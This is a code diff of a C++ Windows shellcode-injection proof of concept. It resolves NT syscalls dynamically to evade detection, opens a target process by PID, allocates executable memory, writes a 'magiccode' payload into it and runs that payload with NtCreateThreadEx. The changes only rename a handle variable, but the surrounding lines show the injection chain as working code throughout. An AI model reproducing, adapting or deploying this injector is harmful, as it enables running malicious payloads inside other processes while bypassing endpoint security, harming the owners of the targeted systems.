@@ -29,9 +29,9 @@ typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
 const int SYSCALL_STUB_SIZE = 23; // How arch depend are syscall stubs? 
 
 // Define function pointers for the dynamic syscalls
-using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
-using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
-using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
+using myNtOpenProcess = NTSTATUS(NTAPI*)(PHANDLE hProcess, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
+using myNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(HANDLE hProcess, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE hProcess, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
 using myNtClose = NTSTATUS(NTAPI*)(HANDLE Handle);
 
 // Define prototype for the API hashing function
@@ -572,7 +572,7 @@ int main(int argc, char *argv[]) {
     myNtOpenProcess NtOpenProcess = (myNtOpenProcess)(LPVOID)syscallStub;
     VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
     // Open the target process
-    HANDLE processHandle;
+    HANDLE hProcess;
     CLIENT_ID clientId = { reinterpret_cast<HANDLE>(pid), nullptr };
     OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);
@@ -580,14 +580,14 @@ int main(int argc, char *argv[]) {
 	if (GetSyscallStub("NtOpenProcess", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
         printf("[+] Memory location of NtOpenProcess syscall stub outwith EAT: %p\n", (void*)NtOpenProcess);
 
-        NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
+        NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
         if (status != STATUS_SUCCESS) {
             printf("[-] NtOpenProcess failed.\n");
             return -1;
         }
         printf("[+] NtOpenProcess succeeded.\n");
         /// In 3 fingers death punch, the process handle will vary signifies the different process to strike. 
-        printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
+        printf("[+] Process handle: %IX\n", (SIZE_T)hProcess);
     } else {
         printf("[-] Failed to execute NtOpenProcess.\n");
     }
@@ -612,13 +612,13 @@ int main(int argc, char *argv[]) {
         if (GetSyscallStub("NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
             printf("[+] Memory location of NtAllocateVirtualMemory syscall stub outwith EAT: %p\n", (void*)NtVirtualAlloc);
 
-            status = NtVirtualAlloc(processHandle, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            status = NtVirtualAlloc(hProcess, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             if (status != STATUS_SUCCESS) {
                 printf("[-] NtAllocateVirtualMemory failed.\n");
                 return -1;
             }
             printf("[+] NtAllocateVirtualMemory succeeded.\n");
-            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
+            printf("[+] Process handle: %IX\n", (SIZE_T)hProcess);
         } else {
             printf("[-] Failed to execute NtAllocateVirtualMemory.\n");
         }
@@ -647,11 +647,11 @@ int main(int argc, char *argv[]) {
 
         ULONG bytesWrittens = 0;
         // Write the magiccode to the allocated memory
-        if (!WriteProcessMemory(processHandle, remoteBuffer, magiccode, sizeof(magiccode), NULL))
+        if (!WriteProcessMemory(hProcess, remoteBuffer, magiccode, sizeof(magiccode), NULL))
         {
             printf("[-]Error writing to process memory.\n");
-            VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
-            CloseHandle(processHandle);
+            VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
             return -1;
         } else {
             printf("[+]Successfully wrote magiccode to the allocated memory.\n");
@@ -663,6 +663,11 @@ int main(int argc, char *argv[]) {
         }
     }
 
+
+
+    //####END####
+
+    
     ///*********************************************************************************
     ///// As a proof-of-concept, we can run the create remote thread from a seperate process
     /// from the other API functions called to get the addresses of remoteBuffer
@@ -672,8 +677,8 @@ int main(int argc, char *argv[]) {
     // Additional function for step == 3
     // if (step == 3) {
     //     // Open the process with the PID passed by the command line argument
-    //     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    //     if (processHandle == NULL) {
+    //     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    //     if (hProcess == NULL) {
     //         printf("[-] Failed to open the process with PID: %lu.\n", pid);
     //         return -1; // or appropriate error handling
     //     }
@@ -698,13 +703,13 @@ int main(int argc, char *argv[]) {
 
         if (GetSyscallStub("NtCreateThreadEx", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
             printf("[+] Memory location of NtCreateThreadEx syscall stub outwith EAT: %p\n", (void*)NtCreateThread);
-            status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, reinterpret_cast<PVOID>(remoteBuffer), nullptr, FALSE, 0, 0, 0, nullptr);
+            status = NtCreateThread(&threadHandle, THREAD_ALL_ACCESS, nullptr, hProcess, reinterpret_cast<PVOID>(remoteBuffer), nullptr, FALSE, 0, 0, 0, nullptr);
             if (status != STATUS_SUCCESS) {
                 printf("[-] NtCreateThreadEx failed.\n");
                 return -1;
             }
             printf("[+] NtCreateThreadEx succeeded.\n");
-            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
+            printf("[+] Process handle: %IX\n", (SIZE_T)hProcess);
         } else {
             printf("[-] Failed to execute NtCreateThreadEx.\n");
         }
@@ -739,7 +744,7 @@ int main(int argc, char *argv[]) {
     VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
     printf("[+] Successful!");
     Sleep(155000);
-    CloseHandle(processHandle);
+    CloseHandle(hProcess);
 
 
     return 0;
